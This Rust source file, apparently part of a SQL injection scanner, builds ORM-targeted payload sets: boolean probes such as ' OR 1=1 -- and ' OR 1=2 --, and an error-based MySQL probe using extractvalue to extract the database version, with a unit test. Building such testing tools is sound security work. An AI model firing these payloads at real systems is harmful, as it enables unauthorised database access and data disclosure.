#![deny(unsafe_code)]

use crate::techniques::boolean::payloads::boolean_payloads_for;

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct OrmPayload {
    pub true_payload: String,
    pub false_payload: String,
    pub error_payload: String,
    pub dbms: String,
}

impl OrmPayload {
    #[must_use]
    pub fn new(
        true_payload: impl Into<String>,
        false_payload: impl Into<String>,
        error_payload: impl Into<String>,
        dbms: impl Into<String>,
    ) -> Self {
        Self {
            true_payload: true_payload.into(),
            false_payload: false_payload.into(),
            error_payload: error_payload.into(),
            dbms: dbms.into(),
        }
    }
}

#[must_use]
pub fn orm_payloads(dbms: Option<&str>) -> Vec<OrmPayload> {
    let comment = " --";
    let base = boolean_payloads_for(dbms);
    let mut out = Vec::new();
    for p in base.into_iter().take(2) {
        out.push(OrmPayload::new(
            p.true_payload,
            p.false_payload,
            format!("' OR 1=1{comment}"),
            dbms.unwrap_or("generic").to_owned(),
        ));
    }
    // ORM-specific error probe.
    out.push(OrmPayload::new(
        format!("' OR 1=1{comment}"),
        format!("' OR 1=2{comment}"),
        "' AND extractvalue(1,concat(0x7e,(select version())))".to_owned(),
        dbms.unwrap_or("generic").to_owned(),
    ));
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let v = orm_payloads(Some("mysql"));
        assert!(!v.is_empty());
        for p in &v {
            assert_ne!(p.true_payload, p.false_payload);
            assert_ne!(p.error_payload, "");
        }
    }
}
